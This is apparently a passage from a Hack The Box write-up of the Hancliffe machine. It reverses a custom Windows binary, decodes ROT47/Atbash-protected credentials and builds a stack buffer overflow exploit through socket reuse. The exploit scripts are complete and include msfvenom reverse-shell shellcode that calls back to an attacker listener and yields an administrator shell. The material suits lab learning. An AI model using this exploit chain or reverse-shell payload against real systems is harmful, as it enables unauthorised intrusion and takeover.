{ _puts(\"Waiting Connection\\r\"); local_1c = listen(local_20, 0x7fffffff); if (local_1c == -1) { // Error handling } else { while (local_20 != 0) { local_14 = (LPVOID) accept(local_20, \u0026amp;local_1f0, \u0026amp;local_1f4); if (local_14 == (LPVOID) 0xffffffff) { // Error handling } _puts(\"Connection Received\\r\"); CreateThread((LPSECURITY_ATTRIBUTES) 0, 0, (LPTHREAD_START_ROUTINE) \u0026amp;_cHandler@4, local_14, 0, (LPDWORD) 0); } closesocket(0); WSACleanup(); iVar2 = 0; } } } } else { // Error handling } return iVar2; }  The connection handler is the following function, which shows all the messages and waits for user input. Here we can see some of the expected values to use the service (namely, Vickry Alfiansyah as full name and T3D83CbJkl1299as code):\nint UndefinedFunction_71901a3d(SOCKET param_1) { int iVar1; char acStack67[17]; char acStack50[10]; int iStack40; char *pcStack36; char *pcStack32; int iStack28; int iStack24; SOCKET SStack20; char *pcStack16; _puts(\"thread cretead\\r\"); pcStack16 = (char *) _malloc(0x400); SStack20 = param_1; _memset(pcStack16, 0, 0x400); iStack24 = send(SStack20, \"Welcome Brankas Application.\\n\", 0x1d, 0); if (iStack24 == -1) { // Error handling } else if (SStack20 != 0) { iStack28 = 0; send(SStack20, \"Username: \", 10, 0); recv(SStack20, pcStack16, 0x400, 0); _strncpy(acStack50, pcStack16, 10); _memset(pcStack16, 0, 0x400); send(SStack20, \"Password: \", 10, 0); recv(SStack20, pcStack16, 0x400, 0); _strncpy(acStack67, pcStack16, 0x11); _memset(pcStack16, 0, 0x400); iStack28 = _login(acStack50, acStack67); if (iStack28 == 0) { send(SStack20, \"Username or Password incorrect\\r\\n\", 0x21, 0); closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } send(SStack20, \"Login Successfully!\\r\\n\", 0x15, 0); pcStack32 = (char *) _malloc(0x50); pcStack36 = (char *) _malloc(100); while (true) { send(SStack20, \"FullName: \", 10, 0); iStack40 = recv(SStack20, pcStack16, 0x400, 0); if (iStack40 == 0) { closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } if (iStack40 \u0026lt; 1) break; _memset(pcStack36, 0, 100); _strncpy(pcStack36, pcStack16, 100); _memset(pcStack16, 0, 0x400); send(SStack20, \"Input Your Code: \", 0x11, 0); recv(SStack20, pcStack16, 0x400, 0); _memset(pcStack32, 0, 0x50); _strncpy(pcStack32, pcStack16, 0x50); _SaveCreds(pcStack32, pcStack36); iVar1 = _strncmp(pcStack32, \"T3D83CbJkl1299\", 0xe); if (iVar1 != 0) { send(SStack20, \"Wrong Code\\r\\n\", 0xd, 0); closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } iVar1 = _strncmp(pcStack36, \"Vickry Alfiansyah\", 0x11); if (iVar1 == 0) { send(SStack20, \"Unlocked\\r\\n\", 0xb, 0); closesocket(SStack20); /* WARNING: Subroutine does not return */ ExitThread(0); } } iVar1 = WSAGetLastError(); _printf(\"Recv failed with error: %d\\n\", iVar1); closesocket(SStack20); iStack24 = 1; } return iStack24; }  There is a function called _login that handles the user authentication:\nint _login(char *param_1, void *param_2) { size_t sVar1; int iVar2; undefined local_39[17]; char *local_28; char *local_24; char *local_20; size_t local_1c; char *local_18; char *local_14; char *local_10; local_10 = \"alfiansyah\"; local_14 = \"YXlYeDtsbD98eDtsWms5SyU=\"; _memmove(local_39, param_2, 0x11); local_18 = (char *) _encrypt1(0, local_39); local_1c = _strlen(local_18); local_24 = (char *) _encrypt2(local_18, local_1c); local_20 = local_24; sVar1 = _strlen(local_24); local_28 = (char *) _b64_encode(local_24, sVar1); iVar2 = _strcmp(local_10, param_1); if ((iVar2 == 0) \u0026amp;\u0026amp; (iVar2 = _strcmp(local_14, local_28), iVar2 == 0)) { return 1; } return 0; }  Now we see that the password is encrypted with two functions encrypt1 and encrypt2 and then encoded in Base64.\nThe encryption functions use a substitution algorithm:\nchar * _encrypt1(int param_1, char *param_2) { char cVar1; char *_Str; size_t sVar2; uint local_10; _Str = _strdup(param_2); sVar2 = _strlen(_Str); for (local_10 = 0; local_10 \u0026lt; sVar2; local_10 = local_10 + 1) { if ((' ' \u0026lt; _Str[local_10]) \u0026amp;\u0026amp; (_Str[local_10] != '\\x7f')) { cVar1 = (char)(_Str[local_10] + 0x2f); if (_Str[local_10] + 0x2f \u0026lt; 0x7f) { _Str[local_10] = cVar1; } else { _Str[local_10] = cVar1 + -0x5e; } } } return _Str; }  char * _encrypt2(char *param_1, int param_2) { bool bVar1; char *pcVar2; byte local_11; int local_10; pcVar2 = _strdup(param_1); for (local_10 = 0; local_10 \u0026lt; param_2; local_10 = local_10 + 1) { local_11 = param_1[local_10]; if ((local_11 \u0026lt; 0x41) || (((0x5a \u0026lt; local_11 \u0026amp;\u0026amp; (local_11 \u0026lt; 0x61)) || (0x7a \u0026lt; local_11)))) { pcVar2[local_10] = local_11; } else { bVar1 = local_11 \u0026lt; 0x5b; if (bVar1) { local_11 = local_11 + 0x20; } pcVar2[local_10] = 'z' - (local_11 + 0x9f); if (bVar1) { pcVar2[local_10] = pcVar2[local_10] + -0x20; } } } return pcVar2; }  Since the Ghidra\u0026rsquo;s decompilation is a little awkward, I decided to rewrite both functions as follows (encrypt1 and encrypt2, respectively):\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char** argv) { int i; int length; char c; char* s; s = argv[1]; length = strlen(s); for (i = 0; i \u0026lt; length; i++) { if (0x20 \u0026lt; s[i] \u0026amp;\u0026amp; s[i] != 0x7f) { c = (char) (s[i] + 0x2f); if (s[i] + 0x2f \u0026lt; 0x7f) { s[i] = c; } else { s[i] = c - 0x5e; } } } puts(s); return 0; }  #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char** argv) { _Bool b; int i; int length; char c; char* s; s = argv[1]; length = strlen(s); for (i = 0; i \u0026lt; length; i++) { c = s[i]; if ((0x41 \u0026lt;= c \u0026amp;\u0026amp; c \u0026lt;= 0x5a) || (0x61 \u0026lt;= c \u0026amp;\u0026amp; c \u0026lt;= 0x7a)) { b = (c \u0026lt;= 0x5a); if (b) { c += ' '; } s[i] = 0x7a - (c + 0x9f); if (b) { s[i] -= 0x20; } } } puts(s); return 0; }  Now we can compile them and analyze their behavior when encrypting all ASCII printable characters (except spaces, newlines and carriage returns):\n$ gcc -o encrypt1 encrypt1.c $ gcc -o encrypt2 encrypt2.c $ chars=\"$(python3 -c 'import string; print(string.printable.strip())')\" $ echo $chars; ./encrypt1 \"$chars\" 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%\u0026'()*+,-./:;?@[\\]^_`{|}~ _`abcdefgh23456789:;?@ABCDEFGHIJKpqrstuvwxyz{|}~!\"#$%\u0026'()*+PQRSTUVWXYZ[\\]^ijklmno,-./01LMNO $ echo $chars; ./encrypt2 \"$chars\" 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%\u0026'()*+,-./:;?@[\\]^_`{|}~ 0123456789zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA!\"#$%\u0026'()*+,-./:;?@[\\]^_`{|}~  The first function does a strange substitution, whereas the second one only reverts the order of uppercase and lowercase letters.\nAlthough we could revert the algorithm or create a mapping between input and output letters to decrypt the password, I decided to use a Bash script to iterate over all printable characters until finding the coincidences:\n#!/usr/bin/env bash encrypted='YXlYeDtsbD98eDtsWms5SyU=' echo \"Encrypted : $encrypted\" encrypted2=$(echo $encrypted | base64 -d) echo \"Encrypted2: $encrypted2\" for i in $(seq 1 ${#encrypted2}); do for d in {32..126}; do c=$(python3 -c \"print(chr($d))\") if [ \"$(./encrypt2 $c)\" = ${encrypted2:i-1:1} ]; then encrypted1+=$c break fi done done echo \"Encrypted1: $encrypted1\" for i in $(seq 1 ${#encrypted1}); do for d in {32..126}; do c=$(python3 -c \"print(chr($d))\") if [ \"$(./encrypt1 $c)\" = ${encrypted1:i-1:1} ]; then decrypted+=$c break fi done done echo \"Decrypted : $decrypted\" echo Re-compute: $(./encrypt2 \"$(./encrypt1 \"$decrypted\")\" | tr -d '\\n' | base64)  The procedure is the inverse. First we decode in Base64, then we decrypt the second encryption and after that we decrypt the first encryption. Once done, we use encrypt1, encrypt2 and base64 to check that we have the correct clear text password:\n$ bash decrypt.sh Encrypted : YXlYeDtsbD98eDtsWms5SyU= Encrypted2: ayXx;ll?|x;lZk9K% Encrypted1: zbCc;oo?|c;oAp9P% Decrypted : K3r4j@@nM4j@pAh!T Re-compute: YXlYeDtsbD98eDtsWms5SyU=  The three scripts can be found in here: decrypt.sh, encrypt1.c, encrypt2.c.\nActually, I found out that the two types of encryption used are well-known algorithms: encrypt1 is ROT47 and encrypt2 is Atbash cipher. We can use CyberChef to decrypt the password in an easier way:\nNice, now we can authenticate successfully:\n$ nc 10.10.11.115 9999 Welcome Brankas Application. Username: alfiansyah Password: K3r4j@@nM4j@pAh!T Login Successfully! FullName: Vickry Alfiansyah Input Your Code: T3D83CbJkl1299 Unlocked Ncat: Broken pipe.  But we got nothing\u0026hellip; Maybe we must exploit the binary\u0026hellip;\nPrivilege escalation (exploiting Buffer Overflow) Looking again at the decompiled C source code, we find a Buffer Overflow vulnerability in a function called _SaveCreds:\nvoid _SaveCreds(char *param_1, char *param_2) { char local_42[50]; char *local_10; local_10 = (char *) _malloc(100); _strcpy(local_10, param_2); _strcpy(local_42, param_1); }  This is vulnerable because local_42 has 50 bytes reserved as buffer, the program uses strcpy (which is known to be vulnerable to Buffer Overflow) and param_1 comes from the connection handler (pcStack32), and it can store at most 0x50 = 80 bytes:\nint UndefinedFunction_71901a3d(SOCKET param_1) { // ... if (iStack24 == -1) { // Error handling } else if (SStack20 != 0) { // ... if (iStack28 == 0) { // ... _memset(pcStack36, 0, 100); _strncpy(pcStack36, pcStack16, 100); _memset(pcStack16, 0, 0x400); send(SStack20, \"Input Your Code: \", 0x11, 0); recv(SStack20, pcStack16, 0x400, 0); _memset(pcStack32, 0, 0x50); _strncpy(pcStack32, pcStack16, 0x50); _SaveCreds(pcStack32, pcStack36); iVar1 = _strncmp(pcStack32, \"T3D83CbJkl1299\", 0xe); // ... } // ... } return iStack24; }  Buffer Overflow vulnerabilities can lead to arbitrary code execution because we can overwrite the saved return address placed on the stack (after the reserved buffer) and redirect code execution.\nFirst of all, we must get the number of characters needed to overwrite the saved return address (that will be placed into $eip register when returning from _SaveCreds). This can be done using a pattern string (cyclic from pwntools or some MetaSploit Framework commands will do the work).\nIn order to develop the final exploit, we will use several files, so that every file is one step further on the exploitation process. Here we have exploitA.py:\n#!/usr/bin/env python3 from pwn import * context.log_level = 'DEBUG' def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' payload = code payload += cyclic(200) r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  For exploiting development purposes, we need a Windows machine with a debugger. This time, I will be using x64dbg (actually a version called x32dbg because we have a 32-bit binary).\nAnother thing to take into account is that the socket server listens in a random port within 9000 and 9999 (it is shown in the server log). That\u0026rsquo;s why I added the IP address and the port as a command line arguments in the Python script. Once the program is ready to accept connections, we execute the exploit:\n$ python3 exploitA.py 192.168.1.47 9291 [+] Opening connection to 192.168.1.47 on port 9291: Done [DEBUG] Received 0x1d bytes: b'Welcome Brankas Application.\\n' [DEBUG] Received 0xa bytes: b'Username: ' [DEBUG] Sent 0xb bytes: b'alfiansyah\\n' [DEBUG] Received 0xa bytes: b'Password: ' [DEBUG] Sent 0x12 bytes: b'K3r4j@@nM4j@pAh!T\\n' [DEBUG] Received 0x15 bytes: b'Login Successfully!\\r\\n' [DEBUG] Received 0xa bytes: b'FullName: ' [DEBUG] Sent 0x12 bytes: b'Vickry Alfiansyah\\n' [DEBUG] Received 0x11 bytes: b'Input Your Code: ' [DEBUG] Sent 0x203 bytes: b'T3D83CbJkl1299aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaa\\n' [*] Closed connection to 192.168.1.47 port 9291  The debugger stops and shows that $eip has a value of 0x6161616e:\nThe value 0x6161616e is naaa in bytes format (little-endian format). We can get the required offset this way:\n$ pwn cyclic -l naaa 52  Now, let\u0026rsquo;s verify that we control $eip by putting BBBB (0x42424242). We will take advantage and add another pattern after $eip to measure how much space we have to write on the stack. This is exploitB.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 payload = code payload += b'A' * offset payload += b'BBBB' payload += cyclic(200) r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  On the above screenshot we see that $eip has a value of 0x42424242, as expected. And also we see that we only have 10 bytes after the position of the saved return address.\nThis is a problem because Windows shellcodes need more than 300 bytes of space. We only have 52 bytes from the junk data (A letters) and 10 additional bytes to add more instructions.\nFirst of all, we must find the address of an instruction jmp esp inside the binary. For that, we can use ROPgadget:\n$ ROPgadget --binary MyFirstApp.exe | grep ': jmp esp' 0x7190239f : jmp esp  Now, we must overwrite the return address with 0x7190239f, which is an address within the binary that performs a jmp esp instruction. We will put 8 breakpoint instructions (\\xcc) after this value, so that the debugger stops when trying to execute them. This is exploitC.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) payload = code payload += b'A' * offset payload += jmp_esp payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Here we see that the program has stopped at the first breakpoint instruction, so we are good to go. The next step will be jumping back on the stack where we have the A letters. The idea is to add instructions there and execute arbitrary code. The length of the jump is 56 (52 from the offset plus 4 from the overwritten address). This is exploitD.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += b'\\xcc' * offset payload += jmp_esp payload += jmp_back payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Right, we stop at the first breakpoint of the padding data. This graph may help understanding the exploiting strategy:\nNow we have 52 bytes to write custom shellcode (the red area). As mentioned before, there is no common payload that fits in 52 bytes, so we will use a technique called Socket Reuse (you can read this write-up from vulnserver.exe for more information).\nWe are going to call recv to read additional data from the socket connection and write it on the stack, so that we don\u0026rsquo;t have the buffer limitation. For this purpose, 52 bytes are enough space.\nTo call recv we need to set the arguments correctly (more information here):\nint recv(SOCKET s, char* buf, int len, int flags);   s is the file descriptor of the socket connection (it changes when the program is restarted). buf is the address of the memory space where to write the received data. len is the maximum length expected to read. flags add some configuration (commonly set to 0).  The first thing we must do is figure out where the socket file descriptor is saved. For that, we will put a breakpoint at a call to recv to check the arguments:\nNow we execute the exploit and see that the program stops at recv:\nThe socket file descriptor is 0x13c, and it is at address 0x0101ff18.\nMoreover, we see that 0x13c is moved from $ebp - 0x10 into $eax, and then the value of $eax is moved to the stack. Hence, 0x13c can also be found at 0x0101ff60 ($ebp - 0x10).\nWe can save the value of the socket file descriptor into $eax using the following assembly instructions:\nadd esp, 0x48 # 83 c4 48 pop eax # 58 push eax # 50 sub esp, 0x48 # 83 ec 48  Notice that we add 0x48 to the stack pointer because 0x0101ff60 - 0x0101ff18 = 0x48, and also we push again to leave the stack unchanged. Let\u0026rsquo;s see if it works with exploitE.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += b'\\xcc' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Alright, everything is correct.\nHowever, there is another problem we must handle. If we continue writing our custom instructions, we will overflow ourselves because we are using the stack. Hence, we need to substract some value to the stack pointer, for example 0x64:\nsub esp, 0x64 # 83 ec 64  Now we prepare the call to recv. For that, we need to push the arguments onto the stack in reverse order (namely, flags, len, buf, s and then use the call instruction) due to the x86 calling conventions.\nThe parameter flags will have a value of 0. Since null bytes are bad characters (since the vulnerable function is strcpy and null bytes end strings in C), we must push a 0 using a xor instruction:\nxor ebx, ebx # 31 db push ebx # 53  The next parameter is len, which will have a value of 0x400 (that is, 1024 bytes of space to write). Again, to avoid null bytes, we can write a single 0x4 into $bh and push $ebx to the stack:\nadd bh, 0x4 # 80 c7 04 push ebx # 53  The next step is to store the address where we want the data to be written to. We will use some offset from the stack pointer for that:\nmov ebx, esp # 89 e3 add ebx, 0x64 # 83 c3 64 push ebx # 53  Finally, we add the socket file descriptor, which was saved in $eax:\npush eax # 50  Let\u0026rsquo;s build exploitF.py just to see that all the arguments are correct before calling recv:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += asm('sub esp, 0x64') payload += asm('xor ebx, ebx') payload += asm('push ebx') payload += asm('add bh, 0x04') payload += asm('push ebx') payload += asm('mov ebx, esp') payload += asm('add ebx, 0x64') payload += asm('push ebx') payload += asm('push eax') payload += b'\\xcc' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\xcc' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) r.close() if __name__ == '__main__': main()  Now we can safely call recv, whose address in the binary is 0x719082ac (take a look at the previous breakpoint). Then we can use something like this:\nmov eax, ds:0x719082ac # a1 ac 82 90 71 call eax # ff d0  I added some breakpoint instructions to see if the socket received and executed our second payload. I also replaced the breakpoint instructions from the first payload to nop instructions (\\x90).\nThis is exploitG.py:\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += asm('sub esp, 0x64') payload += asm('xor ebx, ebx') payload += asm('push ebx') payload += asm('add bh, 0x04') payload += asm('push ebx') payload += asm('mov ebx, esp') payload += asm('add ebx, 0x64') payload += asm('push ebx') payload += asm('push eax') payload += asm('mov eax, dword ptr ds:0x719082ac') payload += asm('call eax') payload += b'\\x90' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\x90' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) shellcode = b'\\xcc' * 400 sleep(1) r.sendline(shellcode) if __name__ == '__main__': main()  Ok, it executes the second payload. Now we can create some shellcode using msfvenom to get a reverse shell on the victim machine:\n$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f c [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of c file: 1386 bytes unsigned char buf[] = \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\" \"\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\" \"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52\" \"\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\" \"\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\" \"\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\" \"\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\" \"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\" \"\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\" \"\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\" \"\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\" \"\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\" \"\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\x0a\\x0a\\x11\\x2c\\x68\" \"\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\" \"\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\" \"\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6\" \"\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\" \"\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\" \"\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\" \"\\x30\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\" \"\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\" \"\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\";  And this is the final exploit (exploitH.py):\n#!/usr/bin/env python3 from pwn import * def main(): ip, port = sys.argv[1], int(sys.argv[2]) username = b'alfiansyah' password = b'K3r4j@@nM4j@pAh!T' fullname = b'Vickry Alfiansyah' code = b'T3D83CbJkl1299' offset = 52 jmp_esp = p32(0x7190239f) jmp_back = asm('jmp $-56') payload = code payload += asm('add esp, 0x48') payload += asm('pop eax') payload += asm('push eax') payload += asm('sub esp, 0x48') payload += asm('sub esp, 0x64') payload += asm('xor ebx, ebx') payload += asm('push ebx') payload += asm('add bh, 0x04') payload += asm('push ebx') payload += asm('mov ebx, esp') payload += asm('add ebx, 0x64') payload += asm('push ebx') payload += asm('push eax') payload += asm('mov eax, ds:0x719082ac') payload += asm('call eax') payload += b'\\x90' * (offset + len(code) - len(payload)) payload += jmp_esp payload += jmp_back payload += b'\\x90' * 8 r = remote(ip, port) r.sendlineafter(b'Username: ', username) r.sendlineafter(b'Password: ', password) r.sendlineafter(b'FullName: ', fullname) r.sendlineafter(b'Input Your Code: ', payload) shellcode = ( b'\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30' b'\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff' b'\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf2\\x52' b'\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1' b'\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b' b'\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03' b'\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b' b'\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24' b'\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb' b'\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c' b'\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68' b'\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68' b'\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\x0a\\x0a\\x11\\x2c\\x68' b'\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61' b'\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2' b'\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3\\x57\\x57\\x57\\x31\\xf6' b'\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44' b'\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56' b'\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff' b'\\x30\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6' b'\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb' b'\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5' ) sleep(1) r.sendline(shellcode) if __name__ == '__main__': main()  Now we run the exploit, and get access to the machine as Administrator:\n$ python3 exploitH.py 10.10.11.115 9999 [+] Opening connection to 10.10.11.115 on port 9999: Done [*] Closed connection to 10.10.11.115 port 9999  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.115. Ncat: Connection from 10.10.11.115:59614. Microsoft Windows [Version 10.0.19043.1266] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami hancliffe\\administrator C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt e4d75760f0ac306abc83fefd82f85c36  The final exploit script can be found in here: exploit.py.\n","image":"/images/HTB/Hancliffe/Hancliffe.png","permalink":"https://7rocky.github.io/en/htb/hancliffe/","section":"htb","summary":"Hack The Box. Windows. Hard machine. This machine contains a webpage that hides a Nuxeo Java application vulnerable to SSTI by breaking nginx parser logic. Then we find access the machine and find an application that has a public exploit to access as another user. After that, we extract Firefox credentials and use a password generator to login as another user and find a custom Windows PE. Having reversed the binary to obtain the expected credentials, we find a Buffer Overflow vulnerability that must be exploited via Socket Reuse to access as Administrator","time":29,"title":"Hancliffe"},{"contents":"  OS: Windows   Difficulty: Easy   IP Address: 10.10.11.106   Release: 02 / 10 / 2021   Port scanning # Nmap 7.92 scan initiated 